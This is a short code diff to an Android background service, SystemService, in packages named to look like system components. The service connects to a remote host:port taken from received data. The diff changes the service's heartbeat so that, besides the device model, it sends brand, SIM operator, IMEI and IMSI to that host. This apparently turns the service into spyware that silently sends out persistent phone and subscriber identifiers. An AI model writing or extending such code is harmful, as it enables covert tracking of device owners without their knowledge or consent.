@@ -8,6 +8,7 @@ import android.content.IntentFilter;
 import android.os.Build;
 import android.os.IBinder;
 import android.os.PowerManager;
+import android.telephony.TelephonyManager;
 
 import com.android.system.NetworkSessionManager;
 import com.android.system.utils.DataPack;
@@ -218,7 +219,18 @@ public class SystemService extends Service{
             String address = new String(data, "UTF-8");
             String[] host_port = address.split(":");
             mSessionManager = new NetworkSessionManager(mSessionHandler);
-            mSessionManager.setHeartBeatData(Build.MODEL.getBytes("UTF-8"));
+            JSONObject jsonObject = new JSONObject();
+            try {
+                TelephonyManager tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
+                jsonObject.put("model",Build.MODEL)
+                        .put("brand",Build.BRAND)
+                        .put("sim_operator",tm.getSimOperatorName())
+                        .put("imei", tm.getDeviceId())
+                        .put("imsi", tm.getSubscriberId());
+            } catch (JSONException e) {
+                e.printStackTrace();
+            }
+            mSessionManager.setHeartBeatData(jsonObject.toString().getBytes("UTF-8"));
             if(host_port.length >= 1) {
                 mSessionManager.setHost( host_port[0] );
             }
